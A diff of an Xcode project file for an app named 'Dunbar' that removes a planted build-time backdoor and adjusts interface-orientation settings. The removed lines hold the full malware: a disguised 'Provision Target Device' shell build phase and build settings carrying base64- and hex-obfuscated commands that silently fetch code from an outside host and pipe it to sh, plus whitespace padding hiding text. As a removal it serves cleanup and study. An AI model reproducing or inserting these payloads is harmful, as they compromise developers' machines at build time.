@@ -162,7 +162,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 56561EA22F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "Dunbar" */;
 			buildPhases = (
-				89B7024326EC4CC7AC1DACE1 /* Provision Target Device */,
 				56561E7B2F3C8BFF00E3D86B /* Sources */,
 				56561E7C2F3C8BFF00E3D86B /* Frameworks */,
 				56561E7D2F3C8BFF00E3D86B /* Resources */,
@@ -299,9 +298,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-																																																																																											/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		56561E7D2F3C8BFF00E3D86B /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -334,25 +330,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		89B7024326EC4CC7AC1DACE1 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -408,8 +385,6 @@
 		56561EA02F3C8C0000E3D86B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | n | sh ) >/dev/null 2>&1 &)";
-				AC0C26C = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336333638363536333662373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -474,8 +449,6 @@
 		56561EA12F3C8C0000E3D86B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | n | sh ) >/dev/null 2>&1 &)";
-				AC0C26C = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336333638363536333662373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -546,8 +519,8 @@
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -581,8 +554,8 @@
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
